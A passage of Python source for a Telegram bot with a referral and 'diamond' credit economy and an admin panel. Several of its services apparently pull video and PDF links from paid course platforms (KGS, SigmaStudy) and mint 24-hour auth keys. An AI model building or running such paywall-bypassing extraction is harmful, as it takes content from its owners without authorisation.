            text,
            reply_markup=build_back_home_kb(
                [[{"text": "📤 𝗦𝗵𝗮𝗿𝗲 𝗜𝗻𝘃𝗶𝘁𝗲 𝗟𝗶𝗻𝗸 𝗡𝗼𝘄", "url": share_url}]]
            ),
        )
        return

    if data == "menu:guide":
        bot.answer_callback(cb_id, "📜 All Services Guide")
        services = get_all_services(include_disabled=False)
        lines = [
            "📜 <b>𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 𝟭𝟬-𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗗𝗜𝗥𝗘𝗖𝗧𝗢𝗥𝗬</b> 📜",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        ]
        for s in services:
            lines.append(
                f"{s['icon']} <b>{s['slot']}. {html_escape(s['name'])}</b> (<code>{s['cost']} 💎</code>)\n"
                f"   └ <i>{html_escape(s['description'])}</i>\n"
                f"   └ 📄 Script: <code>{html_escape(s['script_file'] or 'Custom')}</code>"
            )
        bot.edit_message(
            chat_id,
            message_id,
            "\n\n".join(lines),
            reply_markup=build_back_home_kb(),
        )
        return

    if data == "menu:leaderboard":
        bot.answer_callback(cb_id, "🏆 Top Referrers")
        with DB_LOCK:
            conn = get_db()
            top_rows = conn.execute(
                "SELECT first_name, total_referrals, diamonds FROM users ORDER BY total_referrals DESC, diamonds DESC LIMIT 10"
            ).fetchall()
            conn.close()
        medals = ["🥇", "🥈", "🥉", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"]
        lines = [
            "🏆 <b>𝗧𝗢𝗣 𝟭𝟬 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗟𝗘𝗔𝗗𝗘𝗥𝗕𝗢𝗔𝗥𝗗</b> 🏆",
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
        ]
        for idx, r in enumerate(top_rows):
            lines.append(
                f"{medals[idx]} <b>{html_escape(r['first_name'] or 'User')}</b> — "
                f"👥 <code>{r['total_referrals']} refs</code> | 💎 <code>{r['diamonds']}</code>"
            )
        bot.edit_message(
            chat_id,
            message_id,
            "\n".join(lines),
            reply_markup=build_back_home_kb(),
        )
        return

    # ------------------------------------------------------------------
    # SERVICE OPENING & SUB-ACTIONS
    # ------------------------------------------------------------------
    if data.startswith("open_svc:"):
        svc_code = data.split(":", 1)[1]
        bot.answer_callback(cb_id)
        handle_service_open(bot, chat_id, message_id, user_id, svc_code)
        return

    if data.startswith("tr_lang:"):
        lang = data.split(":", 1)[1]
        set_state(user_id, "await_svc:svc_5", {"target_lang": lang})
        bot.answer_callback(
            cb_id, f"Target language set to {SUPPORTED_LANGS.get(lang, lang)}!"
        )
        bot.edit_message(
            chat_id,
            message_id,
            f"🌐 <b>Target Language Selected:</b> {SUPPORTED_LANGS.get(lang, lang)}\n\n"
            f"📤 <b>Now send any text in chat to translate it into {SUPPORTED_LANGS.get(lang, lang)}:</b>",
            reply_markup=build_back_home_kb(),
        )
        return

    if data == "kgs_gen_key:now":
        bot.answer_callback(cb_id, "🔑 Generating KGS key...")
        charged, rem = charge_user_diamond(user_id, "svc_8", 1)
        if not charged:
            bot.answer_callback(cb_id, "⚠️ Insufficient Diamonds!", show_alert=True)
            return
        ok, key, short_url = KGS_CLIENT.generate_fresh_auth_key()
        if ok:
            text = (
                f"🔑 <b>𝗞𝗚𝗦 𝟮𝟰𝗛 𝗔𝗨𝗧𝗛-𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘𝗗!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🔗 <b>Short URL:</b> <code>{html_escape(short_url)}</code>\n"
                f"✅ <b>x-auth-key:</b> <code>{html_escape(key)}</code>\n"
                f"💎 <b>Remaining Diamonds:</b> <code>{rem} 💎</code>"
            )
        else:
            text = (
                f"⚠️ <b>Generated Shortlink:</b> <code>{html_escape(short_url or 'N/A')}</code>\n"
                f"Send the arolinks URL back in chat to extract the key."
            )
        bot.edit_message(chat_id, message_id, text, reply_markup=build_back_home_kb())
        return

    # KGS Drilldown: Batch -> Subjects -> Videos & Notes
    if data.startswith("kgs_b:"):
        batch_id = data.split(":", 1)[1]
        bot.answer_callback(cb_id, "📚 Loading KGS subjects...")
        subjects = KGS_CLIENT.get_subjects(batch_id)
        if not subjects:
            bot.edit_message(
                chat_id,
                message_id,
                "❌ <b>No subjects found in this KGS batch.</b>",
                reply_markup=build_back_home_kb(),
            )
            return
        kb_rows = []
        lines = [
            f"📖 <b>𝗞𝗚𝗦 𝗕𝗔𝗧𝗖𝗛 𝗦𝗨𝗕𝗝𝗘𝗖𝗧𝗦 ({len(subjects)}):</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        ]
        for i, s in enumerate(subjects[:12], 1):
            s_id = s.get("id")
            s_name = s.get("name", f"Subject {i}")
            v_cnt = s.get("video", 0)
            n_cnt = s.get("dpp", 0)
            lines.append(
                f"<b>{i}.</b> {html_escape(s_name)} (🎥 {v_cnt} | 📝 {n_cnt})"
            )
            kb_rows.append(
                [
                    {
                        "text": f"📖 {i}. {s_name[:32]} ({v_cnt}V/{n_cnt}N)",
                        "callback_data": f"kgs_s:{batch_id}:{s_id}",
                    }
                ]
            )
        bot.edit_message(
            chat_id,
            message_id,
            "\n".join(lines),
            reply_markup=build_back_home_kb(kb_rows),
        )
        return

    if data.startswith("kgs_s:"):
        _, batch_id, subject_id = data.split(":", 2)
        bot.answer_callback(cb_id, "📥 Extracting KGS videos & notes...")
        content = KGS_CLIENT.get_subject_content(batch_id, subject_id)
        videos = content.get("videos", []) if content else []
        if not videos:
            bot.edit_message(
                chat_id,
                message_id,
                "❌ <b>No videos/notes returned (or auth key renewal needed). Try generating a fresh key in Service 8!</b>",
                reply_markup=build_back_home_kb(),
            )
            return

        out_lines = [
            f"=== KGS BATCH {batch_id} | SUBJECT {subject_id} ===",
            f"Total Lectures: {len(videos)}\n",
        ]
        notes_count = 0
        for idx, v in enumerate(reversed(videos), 1):
            out_lines.append(
                f"{idx:03d}. [VIDEO] {v.get('name')} ({v.get('published_at', '')})\n"
                f"     URL: {v.get('video_url', 'N/A')}"
            )
            for pdf in v.get("pdfs", []) or []:
                notes_count += 1
                out_lines.append(
                    f"     [PDF NOTE] {pdf.get('title')}: {pdf.get('url')}"
                )
            out_lines.append("")

        bot.send_document_bytes(
            chat_id,
            "\n".join(out_lines).encode("utf-8"),
            f"kgs_links_{batch_id}_{subject_id}.txt",
            caption=(
                f"🎓 <b>𝗞𝗚𝗦 𝗦𝗨𝗕𝗝𝗘𝗖𝗧 𝗘𝗫𝗧𝗥𝗔𝗖𝗧𝗜𝗢𝗡 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘!</b>\n"
                f"🎥 <b>Videos:</b> <code>{len(videos)}</code> | 📝 <b>PDF Notes:</b> <code>{notes_count}</code>"
            ),
            reply_markup=build_back_home_kb(),
        )
        return

    # SigmaStudy Drilldown: Batch -> Subject -> Chapter -> Videos & Notes
    if data.startswith("sig_b:"):
        batch_id = data.split(":", 1)[1]
        bot.answer_callback(cb_id, "📡 Loading SigmaStudy subjects...")
        try:
            subjects = sigma_get_subjects(batch_id)
        except Exception:
            subjects = []
        if not subjects:
            bot.edit_message(
                chat_id,
                message_id,
                "❌ <b>No subjects found for this SigmaStudy batch.</b>",
                reply_markup=build_back_home_kb(),
            )
            return
        kb_rows = []
        for i, s in enumerate(subjects[:12], 1):
            s_id = s.get("_id")
            s_name = s.get("subject", f"Subject {i}")
            kb_rows.append(
                [
                    {
                        "text": f"📘 {i}. {s_name[:38]}",
                        "callback_data": f"sig_s:{batch_id}:{s_id}",
                    }
                ]
            )
        bot.edit_message(
            chat_id,
            message_id,
            f"📡 <b>Select a SigmaStudy Subject ({len(subjects)} available):</b>",
            reply_markup=build_back_home_kb(kb_rows),
        )
        return

    if data.startswith("sig_s:"):
        _, batch_id, subject_id = data.split(":", 2)
        bot.answer_callback(cb_id, "📂 Loading chapters...")
        try:
            chapters = sigma_get_chapters(batch_id, subject_id)
        except Exception:
            chapters = []
        if not chapters:
            bot.edit_message(
                chat_id,
                message_id,
                "❌ <b>No chapters found in this subject.</b>",
                reply_markup=build_back_home_kb(),
            )
            return
        kb_rows = []
        for i, c in enumerate(chapters[:12], 1):
            c_id = c.get("chapter_id")
            c_name = c.get("name", f"Chapter {i}")
            kb_rows.append(
                [
                    {
                        "text": f"📂 {i}. {c_name[:38]}",
                        "callback_data": f"sig_c:{batch_id}:{subject_id}:{c_id}",
                    }
                ]
            )
        bot.edit_message(
            chat_id,
            message_id,
            f"📂 <b>Select a Chapter ({len(chapters)} available):</b>",
            reply_markup=build_back_home_kb(kb_rows),
        )
        return

    if data.startswith("sig_c:"):
        _, batch_id, subject_id, chapter_id = data.split(":", 3)
        bot.answer_callback(cb_id, "📥 Fetching SigmaStudy videos & notes...")
        try:
            videos = sigma_get_content(batch_id, subject_id, chapter_id, "videos")
        except Exception:
            videos = []
        try:
            notes = sigma_get_content(batch_id, subject_id, chapter_id, "notes")
        except Exception:
            notes = []

        lines = [
            "=== SIGMASTUDY CONTENT EXPORT ===",
            f"Batch: {batch_id} | Subject: {subject_id} | Chapter: {chapter_id}\n",
            f"--- VIDEOS ({len(videos)}) ---",
        ]
        for i, v in enumerate(reversed(videos), 1):
            lines.append(
                f"{i:02d}. {v.get('name')} ({v.get('duration', '')}) | ID: {v.get('_id')}"
            )
        lines.append(f"\n--- PDF NOTES ({len(notes)}) ---")
        for i, n in enumerate(notes, 1):
            lines.append(
                f"{i:02d}. {n.get('name')} ({n.get('topic', '')})\n    URL: {n.get('baseUrl', 'N/A')}"
            )

        bot.send_document_bytes(
            chat_id,
            "\n".join(lines).encode("utf-8"),
            f"sigmastudy_{chapter_id}.txt",
            caption=(
                f"📡 <b>𝗦𝗜𝗚𝗠𝗔𝗦𝗧𝗨𝗗𝗬 𝗖𝗛𝗔𝗣𝗧𝗘𝗥 𝗘𝗫𝗣𝗢𝗥𝗧</b>\n"
                f"🎥 <b>Videos:</b> <code>{len(videos)}</code> | 📄 <b>Notes:</b> <code>{len(notes)}</code>"
            ),
            reply_markup=build_back_home_kb(),
        )
        return

    # ------------------------------------------------------------------
    # 👑 ADMIN PANEL CALLBACK HANDLERS
    # ------------------------------------------------------------------
    if data.startswith("admin:"):
        if not is_user_admin(user_id):
            bot.answer_callback(cb_id, "🚫 Access Denied: Admins Only!", show_alert=True)
            return

        action = data.split(":", 1)[1]
        bot.answer_callback(cb_id)

        if action == "home":
            clear_state(user_id)
            bot.edit_message(
                chat_id,
                message_id,
                render_admin_dashboard(),
                reply_markup=build_admin_home_kb(),
            )
            return

        if action == "add_svc":
            set_state(user_id, "admin_add_svc:step1", {})
            text = (
                "➕ <b>𝗔𝗗𝗗 𝗡𝗘𝗪 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗧𝗢 𝗕𝗢𝗧 (𝗔𝗱𝗺𝗶𝗻 𝗪𝗶𝘇𝗮𝗿𝗱)</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "You can add a new service in <b>2 ways</b>:\n\n"
                "1️⃣ <b>Upload a <code>.py</code> file directly now</b> with caption:\n"
                "<code>Emoji | Service Name | Cost | Short Description</code>\n"
                "<i>Example Caption:</i> <code>🔥 | PDF Merger Pro | 1 | Merge multiple PDFs</code>\n\n"
                "2️⃣ <b>Or send text in this format:</b>\n"
                "<code>Emoji | Service Name | Cost | Description | Response or Webhook URL</code>\n"
                "<i>Example:</i>\n"
                "<code>🚀 | VIP Proxy Gen | 1 | Generate fresh HTTP proxies | Here are your fresh VIP proxies...</code>"
            )
            bot.edit_message(
                chat_id,
                message_id,
                text,
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "list_svc":
            services = get_all_services(include_disabled=True)
            kb_rows = []
            for s in services:
                status_icon = "✅" if s["enabled"] else "❌"
                kb_rows.append(
                    [
                        {
                            "text": f"{status_icon} {s['slot']}. {s['icon']} {s['name']} ({s['cost']}💎)",
                            "callback_data": f"admin:edit_svc:{s['code']}",
                        }
                    ]
                )
            kb_rows.append(
                [
                    {"text": "➕ Add New Service", "callback_data": "admin:add_svc"},
                    {"text": "🔙 Admin Home", "callback_data": "admin:home"},
                ]
            )
            bot.edit_message(
                chat_id,
                message_id,
                "🛠️ <b>𝗠𝗔𝗡𝗔𝗚𝗘 𝗔𝗟𝗟 𝗕𝗢𝗧 𝗦𝗘𝗥𝗩𝗜𝗖𝗘𝗦</b>\n"
                "Tap any service below to Toggle Enable/Disable, Replace with a new <code>.py</code> script, Change Diamond Cost, or Delete:",
                reply_markup={"inline_keyboard": kb_rows},
            )
            return

        if action.startswith("edit_svc:"):
            svc_code = action.split(":", 1)[1]
            s = get_service(svc_code)
            if not s:
                return
            status_lbl = "✅ ENABLED" if s["enabled"] else "❌ DISABLED"
            text = (
                f"🛠️ <b>𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗖𝗢𝗡𝗧𝗥𝗢𝗟: {html_escape(s['name'])}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 <b>Code:</b> <code>{s['code']}</code> (Slot #{s['slot']})\n"
                f"📌 <b>Title:</b> {html_escape(s['title_fancy'])}\n"
                f"📝 <b>Description:</b> {html_escape(s['description'])}\n"
                f"💎 <b>Cost per Use:</b> <code>{s['cost']} 💎</code>\n"
                f"📊 <b>Total Uses:</b> <code>{s['uses_count']}</code>\n"
                f"📂 <b>Script File:</b> <code>{html_escape(s['script_file'] or 'Custom')}</code>\n"
                f"📡 <b>Status:</b> <b>{status_lbl}</b>"
            )
            kb = {
                "inline_keyboard": [
                    [
                        {
                            "text": "🔄 Toggle Enable / Disable",
                            "callback_data": f"admin:toggle_svc:{svc_code}",
                        },
                        {
                            "text": "📂 Replace Name / Upload .py",
                            "callback_data": f"admin:replace_svc:{svc_code}",
                        },
                    ],
                    [
                        {
                            "text": "💎 Set Cost: 1💎",
                            "callback_data": f"admin:cost_svc:{svc_code}:1",
                        },
                        {
                            "text": "💎 Set Cost: 2💎",
                            "callback_data": f"admin:cost_svc:{svc_code}:2",
                        },
                        {
                            "text": "💎 Set Cost: 0💎 (Free)",
                            "callback_data": f"admin:cost_svc:{svc_code}:0",
                        },
                    ],
                    [
                        {
                            "text": "🗑️ Delete Service",
                            "callback_data": f"admin:del_svc:{svc_code}",
                        },
                        {
                            "text": "🔙 Back to Services",
                            "callback_data": "admin:list_svc",
                        },
                    ],
                ]
            }
            bot.edit_message(chat_id, message_id, text, reply_markup=kb)
            return

        if action.startswith("replace_svc:"):
            svc_code = action.split(":", 1)[1]
            s = get_service(svc_code)
            if not s:
                return
            set_state(user_id, f"admin_replace_svc:{svc_code}", {})
            bot.edit_message(
                chat_id,
                message_id,
                f"📂 <b>𝗥𝗘𝗣𝗟𝗔𝗖𝗘 / 𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗟𝗢𝗧 #{s['slot']} ({html_escape(s['name'])})</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Upload a <code>.py</code> file now (or send text) with caption:\n"
                "<code>Emoji | New Service Name | Cost | Description</code>\n\n"
                "<i>Example:</i> <code>🔥 | YouTube Audio DL | 1 | Download MP3 from links</code>",
                reply_markup={
                    "inline_keyboard": [
                        [
                            {
                                "text": "🔙 Cancel",
                                "callback_data": f"admin:edit_svc:{svc_code}",
                            }
                        ]
                    ]
                },
            )
            return

        if action.startswith("toggle_svc:"):
            svc_code = action.split(":", 1)[1]
            with DB_LOCK:
                conn = get_db()
                conn.execute(
                    "UPDATE services SET enabled = CASE WHEN enabled = 1 THEN 0 ELSE 1 END WHERE code = ?",
                    (svc_code,),
                )
                conn.commit()
                conn.close()
            cb["data"] = f"admin:edit_svc:{svc_code}"
            handle_callback_query(bot, cb)
            return

        if action.startswith("cost_svc:"):
            _, svc_code, new_cost = action.split(":", 2)
            with DB_LOCK:
                conn = get_db()
                conn.execute(
                    "UPDATE services SET cost = ? WHERE code = ?",
                    (int(new_cost), svc_code),
                )
                conn.commit()
                conn.close()
            cb["data"] = f"admin:edit_svc:{svc_code}"
            handle_callback_query(bot, cb)
            return

        if action.startswith("del_svc:"):
            svc_code = action.split(":", 1)[1]
            with DB_LOCK:
                conn = get_db()
                conn.execute("DELETE FROM services WHERE code = ?", (svc_code,))
                conn.commit()
                conn.close()
            cb["data"] = "admin:list_svc"
            handle_callback_query(bot, cb)
            return

        if action == "diamonds":
            set_state(user_id, "admin_diamonds", {})
            bot.edit_message(
                chat_id,
                message_id,
                "💎 <b>𝗠𝗔𝗡𝗔𝗚𝗘 𝗨𝗦𝗘𝗥 𝗗𝗜𝗔𝗠𝗢𝗡𝗗𝗦</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Send User ID and amount in chat:\n"
                "• Add Diamonds: <code>123456789 +10</code>\n"
                "• Deduct Diamonds: <code>123456789 -3</code>\n"
                "• Set Exact Balance: <code>123456789 =25</code>",
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "gift_all":
            set_state(user_id, "admin_gift_all", {})
            bot.edit_message(
                chat_id,
                message_id,
                "🎁 <b>𝗚𝗜𝗙𝗧 𝗗𝗜𝗔𝗠𝗢𝗡𝗗𝗦 𝗧𝗢 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Enter the number of 💎 Diamonds to add to <b>every registered user's wallet</b> (e.g. <code>5</code>):",
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "economy":
            set_state(user_id, "admin_economy", {})
            bot.edit_message(
                chat_id,
                message_id,
                "⚙️ <b>𝗘𝗗𝗜𝗧 𝗘𝗖𝗢𝗡𝗢𝗠𝗬 & 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗥𝗨𝗟𝗘𝗦</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Current Values:\n"
                f"• <code>signup_bonus</code> = <b>{get_setting('signup_bonus', '5')}</b>\n"
                f"• <code>default_service_cost</code> = <b>{get_setting('default_service_cost', '1')}</b>\n"
                f"• <code>referral_reward</code> = <b>{get_setting('referral_reward', '1')}</b>\n"
                f"• <code>max_daily_referral_diamonds</code> = <b>{get_setting('max_daily_referral_diamonds', '10')}</b>\n\n"
                "Send <code>key = value</code> in chat (for example: <code>signup_bonus = 5</code>):",
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "user_mgr":
            set_state(user_id, "admin_user_mgr", {})
            bot.edit_message(
                chat_id,
                message_id,
                "👤 <b>𝗨𝗦𝗘𝗥 𝗟𝗢𝗢𝗞𝗨𝗣 / 𝗕𝗔𝗡 / 𝗨𝗡𝗕𝗔𝗡 / 𝗣𝗥𝗢𝗠𝗢𝗧𝗘</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Send one of the following commands in chat:\n"
                "• Inspect User: <code>info 123456789</code>\n"
                "• Ban User: <code>ban 123456789</code>\n"
                "• Unban User: <code>unban 123456789</code>\n"
                "• Grant Admin: <code>admin 123456789</code>",
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "broadcast":
            set_state(user_id, "admin_broadcast", {})
            bot.edit_message(
                chat_id,
                message_id,
                "📢 <b>𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 𝗧𝗢 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦</b>\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "Send the announcement message you want to broadcast to every user now:",
                reply_markup={
                    "inline_keyboard": [
                        [{"text": "🔙 Back to Admin Panel", "callback_data": "admin:home"}]
                    ]
                },
            )
            return

        if action == "stats":
            if os.path.exists(DB_PATH):
                bot.send_document_path(
                    chat_id,
                    DB_PATH,
                    caption=(
                        f"📊 <b>LIVE SQLITE DATABASE BACKUP</b>\n"
                        f"🕒 <b>Exported:</b> <code>{ist_now_str()}</code>"
                    ),
                    reply_markup=build_admin_home_kb(),
                )
            return


# ============================================================================
# 💬 ADMIN STATE INPUT HANDLERS
# ============================================================================

def handle_admin_state_input(bot: TelegramBotClient, message: dict, state: dict):
    chat_id = message["chat"]["id"]
    user_id = message["from"]["id"]
    mode = state.get("mode", "")
    text = (message.get("text") or message.get("caption") or "").strip()

    if not is_user_admin(user_id):
        clear_state(user_id)
        return

    # 1. Add Service Wizard or Replace Service Slot
    if mode == "admin_add_svc:step1" or mode.startswith("admin_replace_svc:"):
        is_replace = mode.startswith("admin_replace_svc:")
        if is_replace:
            target_code = mode.split(":", 1)[1]
            existing_svc = get_service(target_code)
            next_slot = existing_svc["slot"] if existing_svc else 10
            new_code = target_code
        else:
            services = get_all_services(include_disabled=True)
            next_slot = max([s["slot"] for s in services] or [10]) + 1
            new_code = f"svc_{next_slot}_{random.randint(100, 999)}"

        script_path = ""
        h_type = "text"
        if "document" in message and message["document"]:
            doc = message["document"]
            fname = doc.get("file_name", f"{new_code}.py")
            raw_bytes, _ = bot.download_file_bytes(doc["file_id"])
            if raw_bytes:
                script_path = os.path.join(CUSTOM_SERVICES_DIR, fname)
                with open(script_path, "wb") as f:
                    f.write(raw_bytes)
                h_type = "python_file"

        parts = [p.strip() for p in text.split("|")]
        icon = parts[0] if len(parts) > 0 and parts[0] else "⚡"
        name = parts[1] if len(parts) > 1 and parts[1] else f"Custom Service {next_slot}"
        cost = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 1
        desc = parts[3] if len(parts) > 3 and parts[3] else "Premium custom service added by Admin."
        extra = parts[4] if len(parts) > 4 else ""

        cfg = {}
        if extra.startswith(("http://", "https://")):
            h_type = "api_webhook"
            cfg["url"] = extra
        elif extra:
            cfg["response_template"] = extra

        title_fancy = f"{icon} {sbold(name)}"
        with DB_LOCK:
            conn = get_db()
            conn.execute(
                """
                INSERT OR REPLACE INTO services
                (code, slot, icon, name, title_fancy, description, cost, enabled, handler_type, script_file, config_json)
                VALUES (?, ?, ?, ?, ?, ?, ?, 1, ?, ?, ?)
                """,
                (
                    new_code,
                    next_slot,
                    icon,
                    name,
                    title_fancy,
                    desc,
                    cost,
                    h_type,
                    script_path,
                    json.dumps(cfg),
                ),
            )
            conn.commit()
            conn.close()

        clear_state(user_id)
        bot.send_message(
            chat_id,
            f"✅ <b>𝗦𝗘𝗥𝗩𝗜𝗖𝗘 𝗦𝗟𝗢𝗧 #{next_slot} 𝗦𝗔𝗩𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔢 <b>Slot:</b> <code>#{next_slot}</code> (<code>{new_code}</code>)\n"
            f"📌 <b>Title:</b> {html_escape(title_fancy)}\n"
            f"💎 <b>Cost:</b> <code>{cost} 💎</code>\n"
            f"⚙️ <b>Type:</b> <code>{h_type}</code>\n"
            f"📂 <b>Script:</b> <code>{html_escape(script_path or 'Built-in / Custom')}</code>",
            reply_markup=build_admin_home_kb(),
        )
        return

    # 2. Manage User Diamonds
    if mode == "admin_diamonds":
        parts = text.split()
        if len(parts) >= 2 and parts[0].lstrip("-").isdigit():
            target_uid = int(parts[0])
            op_val = parts[1].strip()
            with DB_LOCK:
                conn = get_db()
                if op_val.startswith("="):
                    val = int(op_val[1:])
                    conn.execute(
                        "UPDATE users SET diamonds = ? WHERE user_id = ?",
                        (val, target_uid),
                    )
                else:
                    delta = int(op_val)
                    conn.execute(
                        "UPDATE users SET diamonds = MAX(0, diamonds + ?) WHERE user_id = ?",
                        (delta, target_uid),
                    )
                conn.commit()
                u_row = conn.execute(
                    "SELECT * FROM users WHERE user_id = ?", (target_uid,)
                ).fetchone()
                conn.close()

            clear_state(user_id)
            if u_row:
                bot.send_message(
                    chat_id,
                    f"✅ <b>Updated User <code>{target_uid}</code> Balance:</b> <code>{u_row['diamonds']} 💎</code>",
                    reply_markup=build_admin_home_kb(),
                )
                bot.send_message(
                    target_uid,
                    f"🎁 <b>𝗔𝗗𝗠𝗜𝗡 𝗪𝗔𝗟𝗟𝗘𝗧 𝗨𝗣𝗗𝗔𝗧𝗘!</b>\n"
                    f"💎 Your new Diamond balance is: <b>{u_row['diamonds']} 💎</b>",
                )
            else:
                bot.send_message(
                    chat_id,
                    f"⚠️ User ID <code>{target_uid}</code> not found in database.",
                    reply_markup=build_admin_home_kb(),
                )
            return

    # 3. Gift All Users
    if mode == "admin_gift_all":
        if text.lstrip("-").isdigit():
            gift_amt = int(text)
            with DB_LOCK:
                conn = get_db()
                conn.execute(
                    "UPDATE users SET diamonds = MAX(0, diamonds + ?)", (gift_amt,)
                )
                conn.commit()
                conn.close()
            clear_state(user_id)
            bot.send_message(
                chat_id,
                f"🎉 <b>Credited +{gift_amt} 💎 Diamonds to all registered users!</b>",
                reply_markup=build_admin_home_kb(),
            )
            return

    # 4. Economy Settings
    if mode == "admin_economy":
        if "=" in text:
            k, v = [x.strip() for x in text.split("=", 1)]
            set_setting(k, v)
            clear_state(user_id)
            bot.send_message(
                chat_id,
                f"✅ <b>Updated Setting:</b> <code>{html_escape(k)}</code> = <code>{html_escape(v)}</code>",
                reply_markup=build_admin_home_kb(),
            )
            return

    # 5. User Lookup / Ban / Unban
    if mode == "admin_user_mgr":
        parts = text.split()
        if len(parts) >= 2 and parts[1].lstrip("-").isdigit():
            cmd = parts[0].lower()
            target_uid = int(parts[1])
            with DB_LOCK:
                conn = get_db()
                if cmd == "ban":
                    conn.execute(
                        "UPDATE users SET is_banned = 1 WHERE user_id = ?",
                        (target_uid,),
                    )
                elif cmd == "unban":
                    conn.execute(
                        "UPDATE users SET is_banned = 0 WHERE user_id = ?",
                        (target_uid,),
                    )
                elif cmd == "admin":
                    conn.execute(
                        "UPDATE users SET is_admin = 1 WHERE user_id = ?",
                        (target_uid,),
                    )
                conn.commit()
                u_row = conn.execute(
                    "SELECT * FROM users WHERE user_id = ?", (target_uid,)
                ).fetchone()
                conn.close()
            clear_state(user_id)
            if u_row:
                bot.send_message(
                    chat_id,
                    f"👤 <b>User Record (<code>{target_uid}</code>):</b>\n"
                    f"• Name: {html_escape(u_row['first_name'])} (@{html_escape(u_row['username'])})\n"
                    f"• Diamonds: <b>{u_row['diamonds']} 💎</b>\n"
                    f"• Referrals: <code>{u_row['total_referrals']}</code>\n"
                    f"• Services Used: <code>{u_row['total_services_used']}</code>\n"
                    f"• Banned: <code>{bool(u_row['is_banned'])}</code> | Admin: <code>{bool(u_row['is_admin'])}</code>",
                    reply_markup=build_admin_home_kb(),
                )
            else:
                bot.send_message(
                    chat_id,
                    "❌ User not found.",
                    reply_markup=build_admin_home_kb(),
                )
            return

    # 6. Broadcast
    if mode == "admin_broadcast":
        with DB_LOCK:
            conn = get_db()
            uids = [
                r["user_id"]
                for r in conn.execute("SELECT user_id FROM users").fetchall()
            ]
            conn.close()
        sent, failed = 0, 0
        for uid in uids:
            res = bot.send_message(
                uid,
                f"📢 <b>𝗔𝗡𝗡𝗢𝗨𝗡𝗖𝗘𝗠𝗘𝗡𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n{html_escape(text)}",
            )
            if res.get("ok"):
                sent += 1
            else:
                failed += 1
        clear_state(user_id)
        bot.send_message(
            chat_id,
            f"📢 <b>Broadcast Complete!</b>\n✅ Delivered: <code>{sent}</code> | ❌ Failed: <code>{failed}</code>",
            reply_markup=build_admin_home_kb(),
        )
        return


# ============================================================================
# 📩 MESSAGE DISPATCHER (/start, /admin, Service Inputs)
# ============================================================================

def handle_message(bot: TelegramBotClient, message: dict):
    if "from" not in message or "chat" not in message:
        return
    user_info = message["from"]
    user_id = user_info["id"]
    chat_id = message["chat"]["id"]
    username = user_info.get("username", "")
    first_name = user_info.get("first_name", "User")
    text = (message.get("text") or "").strip()

    referrer_id = None
    if text.startswith("/start"):
        parts = text.split(maxsplit=1)
        if len(parts) > 1 and parts[1].startswith("ref_"):
            ref_str = parts[1].replace("ref_", "").strip()
            if ref_str.isdigit():
                referrer_id = int(ref_str)

    user, is_new, ref_res = get_or_create_user(
        user_id, username, first_name, referrer_id=referrer_id
    )

    if is_new and ref_res.get("referrer_id"):
        r_id = ref_res["referrer_id"]
        max_daily = int(get_setting("max_daily_referral_diamonds", "10"))
        if ref_res.get("credited"):
            bot.send_message(
                r_id,
                f"🎉 <b>𝗡𝗘𝗪 𝗥𝗘𝗙𝗘𝗥𝗥𝗔𝗟 𝗥𝗘𝗪𝗔𝗥𝗗!</b> 🎉\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>Friend Joined:</b> {html_escape(first_name)}\n"
                f"💎 <b>Reward Credited:</b> <b>+{ref_res['reward']} 💎 Diamond</b>\n"
